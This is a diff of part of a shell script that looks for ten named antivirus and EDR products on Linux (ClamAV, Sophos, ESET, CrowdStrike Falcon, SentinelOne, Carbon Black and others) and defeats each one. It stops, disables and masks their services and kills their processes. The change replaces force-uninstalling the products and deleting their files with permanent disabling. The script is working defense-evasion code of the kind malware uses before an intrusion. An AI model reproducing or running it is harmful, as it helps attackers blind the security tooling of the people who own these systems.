@@ -2231,161 +2231,131 @@ echo "[*] Checking for antivirus scanners..."
 
 # ClamAV
 if systemctl is-active --quiet clamav-daemon 2>/dev/null || command -v clamscan >/dev/null 2>&1; then
-    echo "[*] Found ClamAV - UNINSTALLING..."
+    echo "[*] Found ClamAV - disabling permanently..."
     systemctl stop clamav-daemon clamav-freshclam 2>/dev/null || true
     systemctl disable clamav-daemon clamav-freshclam 2>/dev/null || true
     systemctl mask clamav-daemon clamav-freshclam 2>/dev/null || true
     killall -9 clamd freshclam clamscan 2>/dev/null || true
     
-    # Uninstall packages
-    apt-get remove --purge -y clamav clamav-daemon clamav-freshclam clamav-base 2>/dev/null || true
-    yum remove -y clamav clamav-update clamav-scanner-systemd 2>/dev/null || true
-    dnf remove -y clamav clamav-update 2>/dev/null || true
-    
-    # Remove leftover files
-    rm -rf /var/lib/clamav /var/log/clamav /etc/clamav
-    rm -f /usr/bin/clamscan /usr/bin/freshclam /usr/sbin/clamd
+    # Disable automatic updates
+    systemctl stop clamav-freshclam.timer 2>/dev/null || true
+    systemctl disable clamav-freshclam.timer 2>/dev/null || true
+    systemctl mask clamav-freshclam.timer 2>/dev/null || true
     
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] ClamAV UNINSTALLED"
+    echo "[✓] ClamAV disabled permanently"
 fi
 
 # Sophos
 if systemctl is-active --quiet sav-protect 2>/dev/null || [ -d /opt/sophos-av ]; then
-    echo "[*] Found Sophos - REMOVING..."
+    echo "[*] Found Sophos - disabling permanently..."
     systemctl stop sav-protect sav-rms 2>/dev/null || true
     systemctl disable sav-protect sav-rms 2>/dev/null || true
     systemctl mask sav-protect sav-rms 2>/dev/null || true
     /opt/sophos-av/bin/savdctl disable 2>/dev/null || true
     killall -9 savd savscand 2>/dev/null || true
-    
-    # Try uninstaller if exists
-    /opt/sophos-av/bin/uninstall.sh 2>/dev/null || true
-    
-    # Force remove
-    rm -rf /opt/sophos-av /etc/sophos /var/log/sophos
-    
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] Sophos REMOVED"
+    echo "[✓] Sophos disabled permanently"
 fi
 
 # ESET
 if systemctl is-active --quiet esets 2>/dev/null || [ -d /opt/eset ]; then
-    echo "[*] Found ESET - REMOVING..."
+    echo "[*] Found ESET - disabling permanently..."
     systemctl stop esets 2>/dev/null || true
     systemctl disable esets 2>/dev/null || true
     systemctl mask esets 2>/dev/null || true
     /opt/eset/esets/sbin/esets_daemon --stop 2>/dev/null || true
     killall -9 esets_daemon 2>/dev/null || true
-    
-    # Try uninstaller
-    /opt/eset/RemoverTool/remover 2>/dev/null || true
-    
-    # Force remove
-    rm -rf /opt/eset /etc/opt/eset /var/opt/eset
-    
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] ESET REMOVED"
+    echo "[✓] ESET disabled permanently"
 fi
 
 # Bitdefender
 if systemctl is-active --quiet bdredline 2>/dev/null || [ -d /opt/bitdefender ]; then
-    echo "[*] Found Bitdefender - REMOVING..."
+    echo "[*] Found Bitdefender - disabling permanently..."
     systemctl stop bdredline 2>/dev/null || true
     systemctl disable bdredline 2>/dev/null || true
     systemctl mask bdredline 2>/dev/null || true
     /opt/bitdefender/bdscan --disable 2>/dev/null || true
     killall -9 bdagent bdscan 2>/dev/null || true
-    rm -rf /opt/bitdefender /etc/opt/BitDefender
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] Bitdefender REMOVED"
+    echo "[✓] Bitdefender disabled permanently"
 fi
 
 # Kaspersky
 if systemctl is-active --quiet kesl 2>/dev/null || [ -d /opt/kaspersky ]; then
-    echo "[*] Found Kaspersky - REMOVING..."
+    echo "[*] Found Kaspersky - disabling permanently..."
     systemctl stop kesl kesl-supervisor 2>/dev/null || true
     systemctl disable kesl kesl-supervisor 2>/dev/null || true
     systemctl mask kesl kesl-supervisor 2>/dev/null || true
     killall -9 kesl klnagent 2>/dev/null || true
-    rm -rf /opt/kaspersky /var/opt/kaspersky /etc/opt/kaspersky
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] Kaspersky REMOVED"
+    echo "[✓] Kaspersky disabled permanently"
 fi
 
 # McAfee
 if systemctl is-active --quiet mfetpd 2>/dev/null || [ -d /opt/McAfee ]; then
-    echo "[*] Found McAfee - REMOVING..."
+    echo "[*] Found McAfee - disabling permanently..."
     systemctl stop mfetpd ma nails cma 2>/dev/null || true
     systemctl disable mfetpd ma nails cma 2>/dev/null || true
     systemctl mask mfetpd ma nails cma 2>/dev/null || true
     /opt/McAfee/ens/tp/init/mfetpd-control.sh stop 2>/dev/null || true
     killall -9 mfetpd masvc 2>/dev/null || true
-    rm -rf /opt/McAfee /etc/McAfee /var/McAfee
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] McAfee REMOVED"
+    echo "[✓] McAfee disabled permanently"
 fi
 
 # Symantec/Norton
 if systemctl is-active --quiet symantec 2>/dev/null || [ -d /opt/Symantec ]; then
-    echo "[*] Found Symantec - REMOVING..."
+    echo "[*] Found Symantec - disabling permanently..."
     systemctl stop symantec smcd rtvscand 2>/dev/null || true
     systemctl disable symantec smcd rtvscand 2>/dev/null || true
     systemctl mask symantec smcd rtvscand 2>/dev/null || true
     /opt/Symantec/symantec_antivirus/sav stop 2>/dev/null || true
     killall -9 rtvscand smcd 2>/dev/null || true
-    rm -rf /opt/Symantec /etc/symantec
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] Symantec REMOVED"
+    echo "[✓] Symantec disabled permanently"
 fi
 
 # CrowdStrike Falcon
 if systemctl is-active --quiet falcon-sensor 2>/dev/null || [ -d /opt/CrowdStrike ]; then
-    echo "[*] Found CrowdStrike Falcon - REMOVING..."
+    echo "[*] Found CrowdStrike Falcon - disabling permanently..."
     systemctl stop falcon-sensor 2>/dev/null || true
     systemctl disable falcon-sensor 2>/dev/null || true
     systemctl mask falcon-sensor 2>/dev/null || true
     /opt/CrowdStrike/falconctl -d 2>/dev/null || true
     killall -9 falcon-sensor 2>/dev/null || true
-    
-    # Uninstall package if exists
-    apt-get remove --purge -y falcon-sensor 2>/dev/null || true
-    yum remove -y falcon-sensor 2>/dev/null || true
-    
-    rm -rf /opt/CrowdStrike /etc/crowdstrike
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] CrowdStrike Falcon REMOVED"
+    echo "[✓] CrowdStrike Falcon disabled permanently"
 fi
 
 # SentinelOne
 if systemctl is-active --quiet sentinelone 2>/dev/null || [ -d /opt/sentinelone ]; then
-    echo "[*] Found SentinelOne - REMOVING..."
+    echo "[*] Found SentinelOne - disabling permanently..."
     systemctl stop sentinelone 2>/dev/null || true
     systemctl disable sentinelone 2>/dev/null || true
     systemctl mask sentinelone 2>/dev/null || true
     /opt/sentinelone/bin/sentinelctl unload 2>/dev/null || true
     killall -9 sentinelone 2>/dev/null || true
-    rm -rf /opt/sentinelone /etc/sentinelone /var/sentinelone
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] SentinelOne REMOVED"
+    echo "[✓] SentinelOne disabled permanently"
 fi
 
 # Carbon Black
 if systemctl is-active --quiet cbdaemon 2>/dev/null || [ -d /opt/carbonblack ]; then
-    echo "[*] Found Carbon Black - REMOVING..."
+    echo "[*] Found Carbon Black - disabling permanently..."
     systemctl stop cbdaemon cb-psc-sensor 2>/dev/null || true
     systemctl disable cbdaemon cb-psc-sensor 2>/dev/null || true
     systemctl mask cbdaemon cb-psc-sensor 2>/dev/null || true
     killall -9 cbdaemon cb 2>/dev/null || true
-    rm -rf /opt/carbonblack /etc/cb
     AV_DISABLED=$((AV_DISABLED + 1))
-    echo "[✓] Carbon Black REMOVED"
+    echo "[✓] Carbon Black disabled permanently"
 fi
 
 if [ $AV_DISABLED -eq 0 ]; then
     echo "[*] No antivirus software detected"
 else
-    echo "[✓] UNINSTALLED/REMOVED $AV_DISABLED antivirus scanner(s)"
+    echo "[✓] Disabled $AV_DISABLED antivirus scanner(s) PERMANENTLY"
 fi
 
 echo ""
